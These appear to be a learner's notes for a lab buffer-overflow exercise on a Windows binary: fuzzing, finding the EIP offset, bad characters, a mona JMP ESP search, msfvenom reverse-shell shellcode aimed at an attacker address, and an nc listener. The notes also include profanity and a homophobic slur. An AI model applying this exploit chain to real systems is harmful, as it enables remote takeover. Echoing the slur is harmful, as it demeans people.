### RDP
```
First we need to connect to the windows machine
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.247.1 /workarea
```

### Fuzzer
```
open immunity debugger and open the bof file in it.
after, we need to check how many bytes sent and it crashes the program.

open the file.exe in the debugger and click the play button to start it.
python3 fuzzer.py
(the number is whenever the program crash in the debugger)
"Fuzzing with 2000 bytes"
"Fuzzing crashed at 2000 bytes"
```

### OffSet number
```
msf-pattern_create -l 2000
copy the string and paste it into the payload inside the offset.py
after, check the debugger for the EIP number and then

msf-pattern_offset -q 6F43396E
[*] Exact match at offset 1978

this is the offset number.
```

### Bad Chars
```
use the badchar.py to generate the list.
replace the overflow payload to the bad chars in the buffer.py
python buffer.py

in the debugger follow in Dump the ESP.

check manual for missing bad chars (search for 0A 0D) the num is the after wards of the recent numb.)
for example: 04 05 06 0A 0D 09 -> bad char is 07.

\x00\x07\x2E\xA0
```

### Jumping Point
```
!mona jmp -r esp -cpb "bad chars here"
example: 
!mona jmp -r esp -cpb "\x00\x07\x2E\xA0"

check the results in the window tab and switch to LOGS you fuck
take one that all are False

for example: 0x625011bb

now the jumping point is reversed cause gay idk
jumping point is \xbb\x11\x50\x62
```

### Shell code
```
msfvenom -p windows/shell_reverse_tcp LHOST=my_ip LPORT=my_port EXITFUNC=thread -b "bad chars here" -f c
example:
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.198.41 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2E\xA0" -f c

replace it in the payload of the buffer.py
```

### Reverse shell
```
open a listener with the port u choose earlier. nc -nlvp 4444
start the debugger again and start the buffer.py
python buffer.py
```
